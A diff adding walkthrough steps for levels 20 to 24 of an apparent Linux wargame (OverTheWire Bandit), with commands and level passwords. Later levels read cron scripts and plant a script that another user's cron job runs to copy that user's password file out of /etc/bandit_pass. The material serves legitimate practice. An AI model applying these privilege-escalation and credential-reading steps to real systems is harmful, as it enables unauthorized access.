@@ -282,3 +282,125 @@ Password: `cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8`
 First, we run the file with no arguments. It says `Run a command as another user. Example: ./bandit20-do id`, so we then run it to find out we can read as `Bandit20`. We use `cat` to read the next level password in `/etc/bandit_pass/bandit20`
 
 Password: `0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO`
+
+## Level 20 → 21
+```bash
+echo -n '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO' | nc -l 55555 &
+./suconnect 55555
+```
+We need to set a server on the `localhost`, on any port, that will send back to anyone the password of `Bandit20`. 
+* `echo` is used to send back the password when a connection is established. `-n` is used to avoid a new line.
+* `|` is a pipe, as used in previous levels.
+* `nc` is used to make the server, `-l` sets it to listen on port `55555`.
+* `&` is used to run that task in the background, so we're able to run another command.
+Then by using the given exec with port `55555` as the input, it connects and gets back the password of `Bandit20` from the server, so it sends the next password.
+
+Password: `EeoULMCra2q0dSkYj561DX7s1CpBuOBt`
+
+## Level 21 → 22
+```bash
+cd /etc/cron.d
+ls
+cat cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+We go to the given directory `cron.d` and see the file `cronjob_bandit22`. `cronjobs` are programs that run in the background at a specific time. The file looks like this:
+```bash
+@reboot bandit24 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit22.sh &> /dev/null
+```
+The second line indicates that the program runs every minute on every day, and it runs the bash file `/usr/bin/cronjob_bandit22.sh`. The file looks like this:
+```bash
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+It makes a file in `/tmp` so that everyone can read it, then it copies the password of `Bandit22` to another file. So by printing the file `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` we find the next password.
+
+Password: `tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`
+
+## Level 22 → 23
+```bash
+cd /etc/cron.d
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+```
+The same as previous level. Here is the content of the file:
+```bash
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+`myname=$(whoami)` runs the `whoami` command and sets `mytarget` as the output of that command, so it equals `bandit22`. So it copies the password of `Bandit22` to the file, but we want the password for `Bandit23`. Trying to edit the bash file fails, we do not have permission for that.
+
+```bash
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+We can see that the target file, `mytarget`, is created by `$(echo I am user $myname | md5sum | cut -d ' ' -f 1)`. It means that it takes the `md5` hash of the string `"echo I am user $myname"` and that is the file containing the nexp password. The left command removes everything after a space. So by running that command with `bandit23` as `$myname`, we get the file's name inside `/tmp/`. Since it is a `cronjob`, the files is created every minute, so it exist and we can read it.
+
+Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`
+
+## Level 23 → 24
+```bash
+cd /etc/cron.d
+ls
+cat cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+```
+This time the file looks like this:
+```bash
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+The script deletes all files in `/var/spool/bandit24/foo`, except for `.` and `..`, if the owner is `bandit23`. 
+
+```bash
+mktemp -d
+cd /tmp/tmp.lQG5yjwLol
+nano shellcode.sh
+touch bandit24_pass.txt
+```
+We need to create a shellcode file, then if we move it to `/var/spool/bandit24/foo` it will be executed. We will make the output file and the following shellcode called `shellcode.sh` in a new temp directory using the `nano` command:
+```bash
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.lQG5yjwLol/bandit24_pass.txt
+```
+As seen in previous levels, the password for `Bandit24` is in `/etc/bandit_pass/bandit24`.
+
+```bash
+ls -l
+chmod 777 bandit24_pass.txt 
+chmod +rx shellcode.sh 
+chmod 777 /tmp/tmp.lQG5yjwLol
+cp shellcode.sh /var/spool/bandit24/foo
+cat bandit24_pass.txt
+```
+We change the permissions of the directory and files so that `Bandit24` will be able to execute out shellcode. Then we copy the shellcode into `/var/spool/bandit24/foo`, it executed and we get the password in `bandit24_pass.txt`.
+
+Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
